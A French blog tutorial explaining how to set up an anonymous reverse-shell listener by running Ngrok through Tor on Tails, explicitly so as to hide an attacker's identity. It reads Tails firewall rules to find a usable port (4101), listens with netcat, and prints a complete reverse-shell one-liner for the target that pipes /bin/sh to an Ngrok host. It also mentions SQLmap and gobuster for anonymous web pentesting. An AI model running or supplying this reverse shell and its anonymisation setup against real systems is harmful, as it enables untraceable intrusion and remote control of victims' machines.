---
title: "Utiliser Ngrok depuis Tails"
tags: [Vie privée et anonymat]
---

EDIT du 4 mars 2023 :

La dernière fois que j'ai utilisé Ngrok il fallait faire avec des barrières supplémentaires.
Par exemple pour le mode `http` il fallait que le client envoie un entête spécifique pour que les requêtes soient acceptées.
Cela peut rendre plus difficile certains scénarios d'utilisation.

Il y a un bon moment de cela j'avais présenté comment il était possible de mettre en place un reverse-shell anonyme [en faisant transiter un tunnel Ngrok à travers un tunnel Tor]({% link _posts/2017-07-22-Les-Questions-Cons-du-Hacking-Un-reverse-shell-anonyme-c-est-possible.md %}).  

L'objectif du présent article consiste à effectuer cette opération depuis le système [Tails](https://tails.boum.org/index.fr.html) qui est très cloisonné et rend impossible toute communication entrante ou sortante qui ne passerait pas par le proxy SOCKS local. Cela évite toute erreur humaine qui pourrait compromettre l'identité de l'attaquant (exemple : oublier de préfixer une commande par un [torify](https://linux.die.net/man/1/torify) ou utiliser un programme donc les fonctions de proxy sont défaillantes). C'est donc un bon exemple d'[OPSEC](https://fr.wikipedia.org/wiki/OPSEC).  

Une fois *Tails* démarré on lance le *Tor Browser* pour se rendre sur *ngrok.com* et sur [la page des téléchargements](https://ngrok.com/download).  

Le site détecte normalement que vous êtes sur un système Linux 64 bits donc il suffit de cliquer sur *Download for Linux*  

![Download Ngrok](/assets/img/tails_ngrok/tails_ngrok_download.png)

On récupère alors une archive zip contenant le binaire. Tails ne dispose pas de la commande `unzip` mais un utilitaire d'archives permet d'extraire graphiquement le fichier :  

![Ngrok unzip binary](/assets/img/tails_ngrok/tail_ngrok_unzip.png)

Une fois le binaire extrait il faut s'enregistrer sur *Ngrok* afin de pouvoir utiliser l'option `tcp` de l'exécutable (on peut faire des tunnels spécifiques à HTTP/HTTPs avec la commande `http`, les autres protocoles sont gérés avec l'option `tcp`).  

*Ngrok* ne fait pas de vérification des informations saisies lors de l'inscription toutefois vous aurez un reCaptcha à résoudre.  

![Register Ngrok account](/assets/img/tails_ngrok/tails_ngrok_register.png)

Une fois connecté avec vos identifiants, vous verrez sur le dashboard une commande permettant l'activation du compte en local.  

![Ngrok token activation](/assets/img/tails_ngrok/tails_ngrok_activate.png)

À ce stade si vous lancez *Ngrok* il ne parviendra pas à établir un tunnel en raison des règles de filtrage strictes de Tails.  

Il faut donc éditer le fichier de configuration de *Ngrok* pour spécifier l'utilisation d'un proxy socks.  

![Ngrok Tor proxy usage](/assets/img/tails_ngrok/tails_ngrok_socks5.png)

L'opération consiste à rajouter dans le fichier `/home/amnesia/.ngrok2/ngrok.yml` la ligne suivante :  

```yaml
socks5_proxy: "socks5://localhost:9050",
```

*Vi* est présent sur le système, mais il s'agit d'une version *tiny* :-( Il faut faire avec.  

Pour créer un tunnel, on serait tenté d'utiliser n'importe quel numéro de port, mais les règles de pare-feu de Tails empêchent même des connexions localhost vers localhost :  

![Tails block tcp connection on localhost](/assets/img/tails_ngrok/tails_ngrok_netcat.png)

On en apprend plus en étudiant les règles iptables :  

```
Chain OUTPUT (policy DROP)
target     prot opt source               destination        
ACCEPT     all  --  anywhere             anywhere             state ESTABLISHED
ACCEPT     icmp --  anywhere             anywhere             state RELATED
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9050 flags:FIN,SYN,RST,ACK/SYN owner UID match _apt
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9050 flags:FIN,SYN,RST,ACK/SYN owner UID match proxy
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9050 flags:FIN,SYN,RST,ACK/SYN owner UID match nobody
ACCEPT     tcp  --  anywhere             localhost            tcp flags:FIN,SYN,RST,ACK/SYN multiport dports 9050,9062,9150 owner UID match amnesia
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9062 flags:FIN,SYN,RST,ACK/SYN owner UID match htp
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9062 flags:FIN,SYN,RST,ACK/SYN owner UID match tails-iuk-get-target-file
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9062 flags:FIN,SYN,RST,ACK/SYN owner UID match tails-upgrade-frontend
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9052 owner UID match root
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9051 owner UID match amnesia
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9051 owner UID match tor-launcher
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:9040 owner UID match amnesia
ACCEPT     udp  --  anywhere             localhost            udp dpt:domain owner UID match amnesia
ACCEPT     udp  --  anywhere             localhost            udp dpt:mdns owner UID match amnesia
DROP       udp  --  anywhere             localhost            udp dpt:domain owner UID match _apt
DROP       udp  --  anywhere             localhost            udp dpt:mdns owner UID match _apt
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:4101 flags:FIN,SYN,RST,ACK/SYN owner UID match amnesia
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:4101 flags:FIN,SYN,RST,ACK/SYN owner UID match Debian-gdm
ACCEPT     tcp  --  anywhere             localhost            tcp dpt:ipp flags:FIN,SYN,RST,ACK/SYN owner UID match amnesia
ACCEPT     tcp  --  anywhere             localhost            tcp dpts:17600:17650 flags:FIN,SYN,RST,ACK/SYN owner UID match amnesia
ACCEPT     tcp  --  anywhere             anywhere             owner UID match clearnet
ACCEPT     udp  --  anywhere             anywhere             owner UID match clearnet udp dpt:domain
ACCEPT     tcp  --  anywhere             anywhere             owner UID match debian-tor tcp flags:FIN,SYN,RST,ACK/SYN state NEW
ACCEPT     udp  --  anywhere             anywhere             owner UID match debian-tor udp dpt:domain
lan        all  --  anywhere             10.0.0.0/8          
lan        all  --  anywhere             172.16.0.0/12      
lan        all  --  anywhere             192.168.0.0/16      
LOG        all  --  anywhere             anywhere             LOG level debug uid prefix "Dropped outbound packet: "
REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable
```

On peut voir que le port 4101 est autorisé or, il semble qu'aucun service ne l'utilise. Notez que pour réaliser des opérations d'administration sur le système (comme ici pour les règles `iptables`) il faut lancer *Tails* avec un réglage défini au démarrage.  

![Tails listening ports](/assets/img/tails_ngrok/tails_listening_ports.png)

On peut finalement mettre un netcat (présent par défaut sur le système) en écoute sur le port `4101` et lancer *Ngrok* avec `./ngrok tcp 4101`.  

Sur la cible, on exécutera un reverse-shell se connectant au serveur *Ngrok* :  

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ngrok.io 13870 >/tmp/f
```

![Ngrok reverse shell](/assets/img/tails_ngrok/tails_ngrok_reverse_shell.png)

*Tails* est très bien pour avoir un bon niveau d'OPSEC sur du pentest web. Les interpréteurs python2 et python3 sont aussi présent donc on peut faire tourner *Wapiti* ou *SQLmap* ou d'autres applications en Python (généralement simples à torifier).  

En revanche certains programmes comme `smbclient` ne sont pas présents et les installer peut nécessiter l'ajout d'un dépôt supplémentaire, on perd donc la philosophie *restreinte* de l'environnement.  

De la même façon les programmes écrits en Go comme `gobuster` ne fonctionnent pas nécessairement avec `torify`. [Whonix](https://www.whonix.org/) serait certainement plus adapté à une utilisation plus large.

*Published March 09 2020 at 18:08*
